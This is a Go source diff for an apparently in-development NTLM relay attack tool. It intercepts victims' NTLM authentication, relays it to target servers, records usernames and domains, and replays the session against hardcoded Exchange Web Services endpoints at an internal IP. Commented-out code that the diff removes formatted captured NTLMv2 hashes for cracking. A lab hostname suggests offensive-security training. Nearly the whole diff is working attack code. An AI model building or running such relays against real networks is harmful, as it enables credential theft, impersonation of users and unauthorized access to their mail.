@@ -7,7 +7,6 @@ import (
 	"encoding/binary"
 	"fmt"
 	"io"
-	"io/fs"
 	"io/ioutil"
 	"net"
 	"net/http"
@@ -35,6 +34,11 @@ func Run(serverAddr string, targets []string) {
 	defer l.Close()
 
 	connexions := []*NTLMAuthHTTPRelay{}
+
+	logger.Print("Targets :\n")
+	for i, target := range targets {
+		logger.Printf("\t%d : %s\n", i, target)
+	}
 
 	for {
 		conn, err := l.Accept()
@@ -71,9 +75,7 @@ func Run(serverAddr string, targets []string) {
 			}
 
 			for _, target := range targets {
-				targetTrimed := strings.Trim(target, "\"")
-
-				err := client.initiateRelais(clientInitiateRequest, targetTrimed)
+				err := client.initiateRelais(clientInitiateRequest, target)
 				if err != nil {
 					logger.Println(err)
 					return
@@ -84,6 +86,28 @@ func Run(serverAddr string, targets []string) {
 			}
 
 			DisplayConnexions(connexions)
+
+			targetURL := []string{
+				"https://10.80.104.12/ews/Exchange.asmx",
+				"https://10.80.104.12/ews/",
+				"https://10.80.104.12/ews/Exchange.asmx",
+				"https://10.80.104.12:444/ews/Exchange.asmx",
+				"https://10.80.104.12:444/ews/Services.wsdl",
+				"https://10.80.104.12/ews/Exchange.asmx",
+			}
+
+			for _, relay := range client.Relays {
+				for _, targetU := range targetURL {
+					time.Sleep(time.Second * 2)
+
+					clientAuthRequest, _ := http.NewRequest("GET", targetU, nil)
+					// gopproxy.CopyHeader(clientAuthRequest.Header, clientInitiateRequest.Header)
+					_, err = relay.SendRequestGetResponse(clientAuthRequest, "gop", "target")
+					if err != nil {
+						logger.Println(err)
+					}
+				}
+			}
 		}()
 	}
 }
@@ -100,9 +124,11 @@ type NTLMAuthHTTPRelay struct {
 }
 
 type Relay struct {
-	target string
-	conn   *http.Client
-	mu     *sync.Mutex
+	parentClientConnUUID string
+	target               string
+	conn                 *http.Client
+	mu                   *sync.Mutex
+	filename             string
 }
 
 func (n *NTLMAuthHTTPRelay) initiateWWWAuthenticate() (*http.Request, error) {
@@ -152,18 +178,22 @@ func (n *NTLMAuthHTTPRelay) initiateWWWAuthenticate() (*http.Request, error) {
 }
 
 func (n *NTLMAuthHTTPRelay) initiateRelais(initialRequest *http.Request, target string) error {
-	func() {
-		logger.Printf("%s | Acquire lock\n", n.ClientConnUUID)
-		n.mu.Lock()
-	}()
-	defer func() {
-		logger.Printf("%s | Release lock\n", n.ClientConnUUID)
-		n.mu.Unlock()
-	}()
+	n.mu.Lock()
+	defer n.mu.Unlock()
+
+	targetURLSanitized := strings.Replace(
+		strings.Replace(
+			strings.Replace(
+				strings.Replace(target, "?", "", -1),
+				"#", "", -1),
+			":", "", -1),
+		"/", "", -1)
 
 	currentRelay := Relay{
-		target: target,
-		mu:     &sync.Mutex{},
+		parentClientConnUUID: n.ClientConnUUID,
+		target:               target,
+		mu:                   &sync.Mutex{},
+		filename:             fmt.Sprintf("%s-%s.html", time.Now().Format("20060102-150405"), targetURLSanitized),
 	}
 
 	// proxyURL, _ := url.Parse("http://127.0.0.1:8888")
@@ -229,49 +259,20 @@ func (n *NTLMAuthHTTPRelay) initiateRelais(initialRequest *http.Request, target 
 			 * Client part
 			 *
 			 */
-			currentRelay.mu.Lock()
+
 			clientNegotiateRequest := gopproxy.CopyRequest(clientInitiateRequest)
-			clientNegotiateRequest.Method = "GET"
-			clientNegotiateRequest.URL, err = url.Parse(target)
+			clientNegotiateRequest.URL, _ = url.Parse(currentRelay.target)
+
+			clientNegotiateResponse, err := currentRelay.SendRequestGetResponse(clientNegotiateRequest, "gop", "target")
 			if err != nil {
 				logger.Println(err)
 				return err
 			}
 
-			clientNegotiateRequest.Header.Set("Connection", "keep-alive")
-			clientNegotiateResp, err := currentRelay.conn.Do(clientNegotiateRequest)
-			if err != nil {
-				logger.Println(err)
-				return err
-			}
+			authorization := clientNegotiateResponse.Header.Get("Www-Authenticate")
 
-			logger.Fprintf(logger.Writer(), "%s | gop :: target | [+] Client NEGOCIATE request :\n", n.ClientConnUUID)
-			clientNegotiateRequestDump, err := httputil.DumpRequest(clientNegotiateRequest, true)
-			if err != nil {
-				logger.Println(err)
-				return err
-			}
-
-			for _, line := range strings.Split(string(clientNegotiateRequestDump), "\n") {
-				logger.Fprintf(logger.Writer(), "%s | gop -> target : %s\n", n.ClientConnUUID, line)
-			}
-			logger.Fprintf(logger.Writer(), "\n")
-
-			logger.Fprintf(logger.Writer(), "%s | gop :: target | [+] Client NEGOCIATE response = Target CHALLENGE:\n", n.ClientConnUUID)
-			clientNegotiateRespDump, err := httputil.DumpResponse(clientNegotiateResp, true)
-			if err != nil {
-				return err
-			}
-
-			for _, line := range strings.Split(string(clientNegotiateRespDump), "\n") {
-				logger.Fprintf(logger.Writer(), "%s | gop <- target : %s\n", n.ClientConnUUID, line)
-			}
-			logger.Fprint(logger.Writer(), "\n")
-
-			authorization := clientNegotiateResp.Header.Get("Www-Authenticate")
-
-			if clientNegotiateResp.StatusCode != 401 {
-				err := fmt.Errorf("client respond with a %s code", clientNegotiateResp.Status)
+			if clientNegotiateResponse.StatusCode != 401 {
+				err := fmt.Errorf("client respond with a %s code", clientNegotiateResponse.Status)
 				logger.Fprintf(logger.Writer(), "%s |   Error       : %s\n", n.ClientConnUUID, err)
 				currentRelay.conn.CloseIdleConnections()
 				return err
@@ -291,15 +292,19 @@ func (n *NTLMAuthHTTPRelay) initiateRelais(initialRequest *http.Request, target 
 				fmt.Fprintf(logger.Writer(), "%s | gop :: target | %s\n", n.ClientConnUUID, line)
 			}
 
-			currentRelay.mu.Unlock()
 			/*
 			 *
 			 * End client part
 			 *
 			 */
+			clientNegotiateResponseDump, err := httputil.DumpResponse(clientNegotiateResponse, true)
+			if err != nil {
 
-			n.clientConn.Write(clientNegotiateRespDump)
-			for _, line := range strings.Split(string(clientNegotiateRespDump), "\n") {
+				return err
+			}
+
+			n.clientConn.Write(clientNegotiateResponseDump)
+			for _, line := range strings.Split(string(clientNegotiateResponseDump), "\n") {
 				logger.Fprintf(logger.Writer(), "%s | client <- gop | %s\n", n.ClientConnUUID, line)
 			}
 
@@ -314,12 +319,6 @@ func (n *NTLMAuthHTTPRelay) initiateRelais(initialRequest *http.Request, target 
 
 			serverAuthenticate := ntlm.NTLMSSP_AUTH{}
 			serverAuthenticate.Read(authorization_bytes)
-
-			// ntlmAuthenticateInfo := fmt.Sprintf("Target Name: %s\nUsername: %s\nWorkstation: %s\n", serverAuthenticate.TargetName.RawData, serverAuthenticate.Username.RawData, serverAuthenticate.Workstation.RawData)
-			// logger.Fprintf(logger.Writer(), "%s | client :: gop | [+] NTLM AUTHENTICATE:\n", n.ClientConnUUID)
-			// for _, line := range strings.Split(ntlmAuthenticateInfo, "\n") {
-			// 	logger.Fprintf(logger.Writer(), "%s | client :: gop | %s\n", n.ClientConnUUID, line)
-			// }
 
 			n.Domain = string(serverAuthenticate.TargetName.RawData)
 			n.Username = string(serverAuthenticate.Username.RawData)
@@ -339,56 +338,20 @@ func (n *NTLMAuthHTTPRelay) initiateRelais(initialRequest *http.Request, target 
 				fmt.Fprintf(logger.Writer(), "%s | client :: gop | %s\n", n.ClientConnUUID, line)
 			}
 
-			// logger.Fprintf(logger.Writer(), "%s | client :: gop | [+] Received token : %s\n", n.ClientConnUUID, clientAuthorization)
-
 			/*
 			 *
 			 * Client part
 			 *
 			 */
-			currentRelay.mu.Lock()
 
-			clientAuthRequest := gopproxy.CopyRequest(clientInitiateRequest)
-			clientAuthRequest.Method = "GET"
-			clientAuthRequest.URL, err = url.Parse(target)
+			clientAuthRequest, _ := http.NewRequest("GET", target, nil)
+			gopproxy.CopyHeader(clientAuthRequest.Header, clientInitiateRequest.Header)
+			clientAuthResponse, err := currentRelay.SendRequestGetResponse(clientAuthRequest, "gop", "target")
 			if err != nil {
-				logger.Fprintln(logger.Writer(), err)
-				return err
-			}
-			clientAuthRequest.Header.Set("Connection", "keep-alive")
-			clientAuthRequest.Header.Set("Accept-Encoding", "deflate")
-			clientAuthRequest.Header.Set("Content-Length", "0")
-
-			clientAuthRequestDump, err := httputil.DumpRequest(clientAuthRequest, true)
-			if err != nil {
-				logger.Fprintln(logger.Writer(), err)
+				logger.Println(err)
 				return err
 			}
 
-			for _, line := range strings.Split(string(clientAuthRequestDump), "\n") {
-				logger.Fprintf(logger.Writer(), "%s | gop -> target : %s\n", n.ClientConnUUID, line)
-			}
-			logger.Fprint(logger.Writer(), "\n")
-
-			clientAuthResp, err := currentRelay.conn.Do(clientAuthRequest)
-			if err != nil {
-				logger.Fprintln(logger.Writer(), err)
-				return err
-			}
-			clientAuthRespDump, err := httputil.DumpResponse(clientAuthResp, true)
-			if err != nil {
-				logger.Fprintln(logger.Writer(), err)
-				return err
-			}
-			io.Copy(ioutil.Discard, clientAuthResp.Body)
-			clientAuthResp.Body.Close()
-
-			for _, line := range strings.Split(string(clientAuthRespDump), "\n") {
-				logger.Fprintf(logger.Writer(), "%s | gop <- target : %s\n", n.ClientConnUUID, line)
-			}
-			logger.Fprint(logger.Writer(), "\n")
-
-			currentRelay.mu.Unlock()
 			/*
 			 *
 			 * End client part
@@ -396,12 +359,23 @@ func (n *NTLMAuthHTTPRelay) initiateRelais(initialRequest *http.Request, target 
 			 */
 
 			// Save response
-			uu, _ := uuid.NewUUID()
-			targetURLSanitized := strings.Replace(strings.Replace(currentRelay.target, ":", "", -1), "/", "", -1)
-			filename := fmt.Sprintf("%s-%s.html", targetURLSanitized, uu)
-			err = os.WriteFile(filename, clientAuthRespDump, fs.ModeAppend)
-			if err != nil {
-				logger.Println(err)
+
+			clientInitialResponseByte := []byte(
+				"HTTP/1.1 401 Unauthorized\n" +
+					"WWW-Authenticate: NTLM\n" +
+					"WWW-Authenticate: Negociate\n" +
+					"Connection: keep-alive\n" +
+					"Content-Length: 0\n" +
+					"\n\n")
+
+			n.clientConn.Write(clientInitialResponseByte)
+
+			for _, line := range strings.Split(string(clientInitialResponseByte), "\n") {
+				fmt.Fprintf(logger.Writer(), "%s | client <- gop | %s\n", n.ClientConnUUID, line)
+			}
+			logger.Fprint(logger.Writer(), "\n")
+			if clientAuthResponse.StatusCode == 401 {
+				return fmt.Errorf("could not authenticate to the endpoint")
 			}
 
 			break
@@ -426,6 +400,79 @@ func DisplayConnexions(connexions []*NTLMAuthHTTPRelay) {
 	}
 }
 
+func (r *Relay) SendRequestGetResponse(clientRequest *http.Request, c string, s string) (*http.Response, error) {
+	r.mu.Lock()
+
+	// clientRequest := gopproxy.CopyRequest(clientInitiateRequest)
+	// clientRequest.Method = "GET"
+	// targetURL, err := url.Parse(r.target)
+	// if err != nil {
+	// 	logger.Fprintln(logger.Writer(), err)
+	// 	return nil, err
+	// }
+	// clientRequest.URL = targetURL
+	clientRequest.Header.Set("Connection", "keep-alive")
+	clientRequest.Header.Set("Accept-Encoding", "deflate")
+	clientRequest.Header.Set("Content-Length", "0")
+
+	clientRequestDump, err := httputil.DumpRequest(clientRequest, true)
+	if err != nil {
+		logger.Fprintln(logger.Writer(), err)
+		return nil, err
+	}
+
+	for _, line := range strings.Split(string(clientRequestDump), "\n") {
+		logger.Fprintf(logger.Writer(), "%s | %s -> %s : %s\n", r.parentClientConnUUID, c, s, line)
+	}
+	logger.Fprint(logger.Writer(), "\n")
+
+	clientResponse, err := r.conn.Do(clientRequest)
+	if err != nil {
+		logger.Fprintln(logger.Writer(), err)
+		return nil, err
+	}
+	clientResponseDump, err := httputil.DumpResponse(clientResponse, true)
+	if err != nil {
+		logger.Fprintln(logger.Writer(), err)
+		return nil, err
+	}
+	io.Copy(ioutil.Discard, clientResponse.Body)
+	clientResponse.Body.Close()
+
+	for _, line := range strings.Split(string(clientResponseDump), "\n") {
+		logger.Fprintf(logger.Writer(), "%s | %s <- %s : %s\n", r.parentClientConnUUID, c, s, line)
+	}
+	logger.Fprint(logger.Writer(), "\n")
+
+	targetURLSanitized := strings.Replace(
+		strings.Replace(
+			strings.Replace(
+				strings.Replace(clientRequest.URL.String(), "?", "", -1),
+				"#", "", -1),
+			":", "", -1),
+		"/", "", -1)
+	filename := fmt.Sprintf("%s-%s.html", time.Now().Format("20060102-150405"), targetURLSanitized)
+	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		logger.Println(err)
+	}
+	defer f.Close()
+
+	_, err = f.Write(clientRequestDump)
+	if err != nil {
+		logger.Println(err)
+	}
+
+	_, err = f.Write(clientResponseDump)
+	if err != nil {
+		logger.Println(err)
+	}
+
+	r.mu.Unlock()
+
+	return clientResponse, nil
+}
+
 func KeepAlive(w http.ResponseWriter, wg *sync.WaitGroup) {
 	wg.Add(1)
 
@@ -442,297 +489,3 @@ func KeepAlive(w http.ResponseWriter, wg *sync.WaitGroup) {
 		time.Sleep(20 * time.Second)
 	}
 }
-
-// func HandleConnection(conn net.Conn) {
-
-// 	logger.Fprintf(logger.Writer(), "Receive conenction from %s to %s\n", conn.RemoteAddr(), conn.LocalAddr())
-// 	reader := bufio.NewReader(conn)
-
-// 	req, err := http.ReadRequest(reader)
-// 	if ok := utils.CheckError(err); ok {
-// 		return
-// 	}
-// 	defer req.Body.Close()
-
-// 	// Dial the client
-// 	initConn, err := net.DialTimeout("tcp4", req.URL.Host, 2*time.Second)
-// 	if ok := utils.CheckError(err); ok {
-// 		return
-// 	}
-// 	defer initConn.Close()
-
-// 	clientConn := tls.Client(initConn, &tls.Config{InsecureSkipVerify: true})
-// 	err = clientConn.Handshake()
-// 	if ok := utils.CheckError(err); ok {
-// 		return
-// 	}
-
-// 	conn.Write([]byte("HTTP/1.1 200 OK\r\nProxy-agent: GoPentest/1.0\r\n\r\n"))
-
-// 	config := &tls.Config{
-// 		InsecureSkipVerify: true,
-// 	}
-
-// 	proxyConn := tls.Server(conn, config)
-// 	err = proxyConn.Handshake()
-// 	if ok := utils.CheckError(err); ok {
-// 		return
-// 	}
-// 	defer proxyConn.Close()
-
-// 	proxyReader := bufio.NewReader(proxyConn)
-// 	req, err := http.ReadRequest(proxyReader)
-// 	if ok := utils.CheckError(err); ok {
-// 		return
-// 	}
-// 	PrintGUIRequest(req)
-// 	intercept()
-
-// 	dumpedReq, _ := httputil.DumpRequest(req, true)
-// 	clientConn.Write(dumpedReq)
-
-// 	clientReader := bufio.NewReader(clientConn)
-// 	res, err := http.ReadResponse(clientReader, req)
-// 	if ok := utils.CheckError(err); ok {
-// 		return
-// 	}
-// 	//defer res.Body.Close()
-
-// 	PrintGUIResponse(*res)
-// 	intercept()
-
-// 	dumpedRes, _ := httputil.DumpResponse(res, true)
-// 	proxyConn.Write(dumpedRes)
-
-// 	proxyConn.Close()
-// 	clientConn.Close()
-// 	return
-
-// 	// Do request to target
-// 	res := doHTTPRequest(req)
-// 	if res == nil {
-// 		return
-// 	}
-// 	//defer res.Body.Close()
-
-// 	sendNetResponse(conn, res)
-// }
-
-// func (n NTLMAuthHTTPRelay) ServeHTTP(w http.ResponseWriter, r *http.Request) {
-// 	// Once a request is received use it to relay it to a website
-// 	logger.Printf("[+] Received a new connexion from : %s\n", r.RemoteAddr)
-// 	_, exist := client[r.RemoteAddr]
-// 	if !exist {
-// 		logger.Printf("[+] Received a new connexion from : %s\n", r.RemoteAddr)
-// 	}
-
-// 	logger.Printf("[+] Server request from client :\n")
-// 	serverInitialRequestDump, err := httputil.DumpRequest(r, true)
-// 	if err != nil {
-// 		logger.Println(err)
-// 		return
-// 	}
-
-// 	for _, line := range strings.Split(string(serverInitialRequestDump), "\n") {
-// 		logger.Printf("client > gop : %s\n", line)
-// 	}
-
-// 	// Get the response header.
-// 	authorization := r.Header.Get("Authorization")
-
-// 	if authorization == "" {
-// 		w.Header().Set("WWW-Authenticate", "NTLM")
-// 		w.WriteHeader(401)
-// 		return
-// 	}
-
-// 	msg3, ntlmv2Response, err := n.Dispatch(w, r)
-// 	if err != nil {
-// 		logger.Print(err)
-// 		return
-// 	}
-
-// 	if msg3 != nil && ntlmv2Response != nil {
-// 		ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(msg3.Username.RawData), string(msg3.TargetName.RawData), []byte(n.NTLMHandler.Challenge), ntlmv2Response.NTProofStr, msg3.NTLMv2Response.RawData[len(ntlmv2Response.NTProofStr):])
-
-// 		authInformations := fmt.Sprintf("%s:%s", string(msg3.TargetName.RawData), string(msg3.Username.RawData))
-// 		if _, found := ntlm.NtlmCapturedAuth[authInformations]; !found {
-// 			ntlm.NtlmCapturedAuth[authInformations] = true
-// 			logger.Printf("\n[+] PWDUMP:\n%s\n", ntlmv2_pwdump)
-// 		} else {
-// 			logger.Printf("\n[+] User %s NTLMv2 challenge was already captured.\n", authInformations)
-// 		}
-// 	}
-// }
-
-// func (n NTLMAuthHTTPRelay) Dispatch(w http.ResponseWriter, r *http.Request) (*ntlm.NTLMSSP_AUTH, *ntlm.NTLMv2Response, error) {
-// 	authorization := r.Header.Get("Authorization")
-// 	authorization_bytes, err := base64.StdEncoding.DecodeString(authorization[5:])
-// 	if err != nil {
-// 		err := fmt.Errorf("Decode error authorization header : %s\n", authorization)
-// 		return nil, nil, err
-// 	}
-// 	msgType := binary.LittleEndian.Uint32(authorization_bytes[8:12])
-
-// 	logger.Printf("[+] Message type : %d\n", msgType)
-
-// 	w.Header().Set("Connection", "keep-alive")
-// 	// Received Negociate message. Handle it and answer with a Challenge message
-// 	if msgType == uint32(1) {
-// 		err := n.NTLMHandler.ServerNegociateFunc(w, r)
-// 		if err != nil {
-// 			return nil, nil, err
-// 		}
-
-// 		/*
-// 		 *
-// 		 * Client part
-// 		 *
-// 		 */
-// 		tr := &http.Transport{
-// 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // <--- Problem
-// 		}
-// 		client := &http.Client{Transport: tr}
-
-// 		clientNegotiateRequest := gopproxy.CopyRequest(r)
-// 		clientNegotiateRequest.Method = "GET"
-// 		clientNegotiateRequest.URL, err = url.Parse(TargetURL)
-// 		if err != nil {
-// 			return nil, nil, err
-// 		}
-// 		clientNegotiateRequest.Header.Set("Connection", "keep-alive")
-
-// 		logger.Printf("[+] Client NEGOCIATE request :\n")
-// 		clientNegotiateRequestDump, err := httputil.DumpRequest(clientNegotiateRequest, true)
-// 		if err != nil {
-// 			return nil, nil, err
-// 		}
-
-// 		for _, line := range strings.Split(string(clientNegotiateRequestDump), "\n") {
-// 			logger.Printf("gop > target : %s\n", line)
-// 		}
-// 		logger.Print("\n")
-// 		clientNegotiateResp, err := client.Do(clientNegotiateRequest)
-// 		if err != nil {
-// 			return nil, nil, err
-// 		}
-
-// 		logger.Printf("[+] Client NEGOCIATE response :\n")
-// 		clientNegotiateRespDump, err := httputil.DumpResponse(clientNegotiateResp, true)
-// 		if err != nil {
-// 			return nil, nil, err
-// 		}
-
-// 		for _, line := range strings.Split(string(clientNegotiateRespDump), "\n") {
-// 			logger.Printf("gop < target : %s\n", line)
-// 		}
-// 		logger.Print("\n")
-
-// 		authorization := clientNegotiateResp.Header.Get("Www-Authenticate")
-
-// 		authorization_bytes, err := base64.StdEncoding.DecodeString(authorization[5:])
-// 		if err != nil {
-// 			err := fmt.Errorf("Decode error authorization header : %s\n", authorization)
-// 			return nil, nil, err
-// 		}
-
-// 		clientChallengeNTLM := ntlm.NTLMSSP_CHALLENGE{}
-// 		clientChallengeNTLM.Read(authorization_bytes)
-
-// 		logger.Print("[+] Client Challenge\n")
-// 		logger.Printf("%s\n", clientChallengeNTLM.ToString())
-
-// 		/*
-// 		 *
-// 		 * End client part
-// 		 *
-// 		 */
-
-// 		err = n.NTLMHandler.ServerChallengeFunc(w, r, string(clientChallengeNTLM.Challenge), "srv-exchange.offsec.lab")
-// 		if err != nil {
-// 			return nil, nil, err
-// 		}
-
-// 		logger.Printf("[+] Send server challenge to client\n")
-
-// 		/**/
-// 		var inp string
-// 		fmt.Print("Next ?")
-// 		fmt.Scanln(&inp)
-// 		/**/
-
-// 		return nil, nil, nil
-// 	}
-
-// 	// Retrieve information into the Authentication message
-// 	if msgType == uint32(3) {
-// 		logger.Printf("[+] Server received Authenticate\n")
-// 		_, _, err := n.NTLMHandler.ServerAuthenticateFunc(w, r)
-// 		if err != nil {
-// 			return nil, nil, err
-// 		}
-
-// 		logger.Printf("[+] Received token : %s\n", authorization)
-
-// 		/**/
-// 		var inp string
-// 		fmt.Print("Next ?")
-// 		fmt.Scanln(&inp)
-// 		/**/
-
-// 		/*
-// 		 *
-// 		 * Client part
-// 		 *
-// 		 */
-// 		tr := &http.Transport{
-// 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-// 		}
-// 		client := &http.Client{Transport: tr}
-
-// 		clientAuthRequest := gopproxy.CopyRequest(r)
-// 		clientAuthRequest.Method = "GET"
-// 		clientAuthRequest.URL, err = url.Parse(TargetURL)
-// 		if err != nil {
-// 			return nil, nil, err
-// 		}
-// 		clientAuthRequest.Header.Set("Connection", "keep-alive")
-
-// 		clientAuthRequestDump, err := httputil.DumpRequest(clientAuthRequest, true)
-// 		if err != nil {
-// 			return nil, nil, err
-// 		}
-
-// 		for _, line := range strings.Split(string(clientAuthRequestDump), "\n") {
-// 			logger.Printf("gop > target : %s\n", line)
-// 		}
-// 		logger.Print("\n")
-
-// 		clientAuthResp, err := client.Do(clientAuthRequest)
-// 		if err != nil {
-// 			return nil, nil, err
-// 		}
-// 		io.Copy(ioutil.Discard, clientAuthResp.Body)
-// 		clientAuthResp.Body.Close()
-
-// 		clientAuthRespDump, err := httputil.DumpResponse(clientAuthResp, true)
-// 		if err != nil {
-// 			return nil, nil, err
-// 		}
-
-// 		for _, line := range strings.Split(string(clientAuthRespDump), "\n") {
-// 			logger.Printf("gop < target : %s\n", line)
-// 		}
-// 		logger.Print("\n")
-
-// 		/*
-// 		 *
-// 		 * End client part
-// 		 *
-// 		 */
-
-// 		return nil, nil, nil
-// 	}
-
-// 	return nil, nil, nil
-// }
